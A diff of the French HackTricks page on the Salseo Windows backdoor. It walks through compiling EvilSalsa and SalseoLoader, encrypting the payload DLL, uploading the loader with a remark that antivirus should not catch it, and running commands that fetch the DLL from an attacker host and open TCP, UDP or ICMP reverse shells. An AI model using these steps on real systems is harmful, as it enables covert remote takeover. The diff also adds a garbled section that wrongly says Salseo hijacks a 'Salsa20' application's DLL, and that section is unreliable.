@@ -1,10 +1,10 @@
-## Salseo
+# Salseo
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -12,7 +12,7 @@
 
 </details>
 
-## Compilation des binaires
+## Compiler les binaires
 
 Téléchargez le code source depuis Github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.
 
@@ -30,7 +30,7 @@ Ensuite, compilez les deux projets (Build -> Build Solution) (Le chemin de l'ex�
 
 ## Préparer la porte dérobée
 
-Tout d'abord, vous devrez encoder le **EvilSalsa.dll**. Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :
+Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :
 
 ### **Python**
 ```
@@ -39,14 +39,32 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-### Windows
+### Introduction
+
+Les backdoors sont des outils très utiles pour les pentesters et les attaquants. Ils permettent d'accéder à un système compromis à distance et de manière discrète. Dans ce chapitre, nous allons nous concentrer sur les backdoors pour les systèmes Windows.
+
+### Salseo
+
+Salseo est un backdoor pour les systèmes Windows qui utilise une technique appelée « DLL hijacking ». Cette technique consiste à remplacer une DLL légitime par une DLL malveillante qui sera chargée par une application tierce. Salseo utilise cette technique pour se charger dans l'application « Salsa20 », qui est un algorithme de chiffrement utilisé par de nombreuses applications.
+
+Une fois que Salseo est chargé dans l'application, il peut être utilisé pour exécuter des commandes à distance, télécharger et exécuter des fichiers, et même prendre le contrôle complet du système compromis.
+
+### Utilisation de Salseo
+
+Pour utiliser Salseo, vous devez d'abord le compiler à l'aide de Visual Studio. Une fois que vous avez compilé le backdoor, vous devez le placer dans le même répertoire que l'application « Salsa20 ». Ensuite, vous devez renommer le backdoor en utilisant le nom de la DLL légitime que vous souhaitez remplacer.
+
+Par exemple, si vous souhaitez remplacer la DLL « salsa20.dll », vous devez renommer le backdoor en « salsa20.dll ». Ensuite, lorsque l'application « Salsa20 » sera lancée, elle chargera la DLL malveillante à la place de la DLL légitime.
+
+### Conclusion
+
+Salseo est un backdoor puissant pour les systèmes Windows qui utilise une technique de DLL hijacking pour se charger dans une application tierce. Il peut être utilisé pour exécuter des commandes à distance, télécharger et exécuter des fichiers, et même prendre le contrôle complet du système compromis. Les pentesters et les attaquants doivent être conscients de cette technique et prendre des mesures pour la prévenir.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, maintenant vous avez tout ce dont vous avez besoin pour exécuter tout le truc Salseo: le **fichier EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**
+Ok, vous avez maintenant tout ce dont vous avez besoin pour exécuter tout le truc Salseo : le **fichier EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**
 
-**Téléchargez le binaire SalseoLoader.exe sur la machine. Il ne devrait pas être détecté par un antivirus...**
+**Téléchargez le binaire SalseoLoader.exe sur la machine. Il ne devrait pas être détecté par un quelconque antivirus...**
 
 ## **Exécuter la porte dérobée**
 
@@ -62,9 +80,9 @@ N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé et un se
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Obtention d'un shell inversé ICMP (dll encodée déjà présente sur la victime)**
+### **Obtenir un shell inverse ICMP (dll encodée déjà présente sur la victime)**
 
-**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inversé. Téléchargez:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inverse. Téléchargez:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Désactiver les réponses ICMP:**
 ```
@@ -99,11 +117,11 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
-Les fichiers suivants sont apparus dans votre dossier de projet: **DllExport.bat** et **DllExport\_Configure.bat**
+Dans votre dossier de projet, les fichiers suivants sont apparus: **DllExport.bat** et **DllExport\_Configure.bat**
 
 ### **Désinstallez** DllExport
 
-Appuyez sur **Désinstaller** (oui, c'est étrange mais croyez-moi, c'est nécessaire)
+Appuyez sur **Désinstaller** (oui, c'est bizarre mais croyez-moi, c'est nécessaire)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2).png>)
 
@@ -121,7 +139,7 @@ Sélectionnez **x64** (si vous allez l'utiliser dans une boîte x64, c'était mo
 
 **\[DllExport]** ne doit plus être marqué comme une erreur
 
-![](<../.gitbook/assets/image (8) (1).png>)
+![](<../.gitbook/assets/image (8) (1) (1).png>)
 
 ### Compilez la solution
 
@@ -160,7 +178,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (ou Command Prompt) est un interpréteur de commandes pour les systèmes d'exploitation Windows. Il permet aux utilisateurs d'exécuter des commandes système, des scripts et des programmes. Les hackers peuvent utiliser CMD pour exécuter des commandes malveillantes sur un système cible. CMD peut également être utilisé pour naviguer dans les fichiers et les dossiers, afficher les processus en cours d'exécution et les connexions réseau, et modifier les paramètres système.
+CMD (Command Prompt) est un outil intégré dans Windows qui permet aux utilisateurs d'interagir avec le système d'exploitation en utilisant des commandes textuelles. Les hackers peuvent utiliser CMD pour exécuter des commandes malveillantes, telles que la création de backdoors ou la suppression de fichiers importants. Il est important de surveiller l'utilisation de CMD sur les systèmes pour détecter toute activité suspecte.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -173,10 +191,10 @@ rundll32.exe SalseoLoader.dll,main
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
